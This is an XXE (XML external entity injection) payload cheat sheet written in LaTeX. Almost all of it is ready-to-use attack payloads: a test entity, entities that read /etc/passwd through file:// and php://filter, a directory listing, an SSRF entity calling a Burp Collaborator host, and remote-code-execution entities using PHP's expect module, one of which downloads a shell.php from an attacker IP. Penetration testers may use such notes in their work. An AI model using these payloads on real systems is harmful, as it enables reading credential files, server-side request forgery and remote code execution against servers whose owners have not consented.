

\section{In Band attack}
\subsection{Identifying reflexion}
\underline{the request}:
\begin{verbatim}
<?xml version = "1.0"?>
<order>
    <quantity>a</quantity>
    <item>Home Appliances</item>
    <address>a</address>
</order>
\end{verbatim}

\underline{the response}: 
\begin{verbatim}
Your order for Home Appliances has been processed
\end{verbatim}


\subsection{Test payload}
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil [
    <!ELEMENT order ANY>
    <!ENTITY payload "pwned"> 
]>
<order>
    <quantity>a</quantity>
    <item>&payload;</item>
    <address>a</address>
</order>
\end{verbatim}

\subsection{Disclosure payload}
\begin{verbatim}
<!ENTITY company SYSTEM "file:///etc/passwd">
<!ENTITY pwn SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!DOCTYPE test [ 
    <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> 
    %init;
]>
<foo/>
\end{verbatim}

Directory listing :
\begin{verbatim}
# only tested on java yet
<!ENTITY company SYSTEM "file:///etc/">
\end{verbatim}

\subsection{SSRF payload}
\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ 
    <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> 
    %xxe; 
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
\end{verbatim}

\subsection{RCE payload}
\begin{verbatim}
# REMOTE CODE EXECUTION using PHP expect module
<!ENTITY rce SYSTEM "expect:id">
# UPLOAD A RSHELL work also in blind
<!ENTITY rshell SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
\end{verbatim}

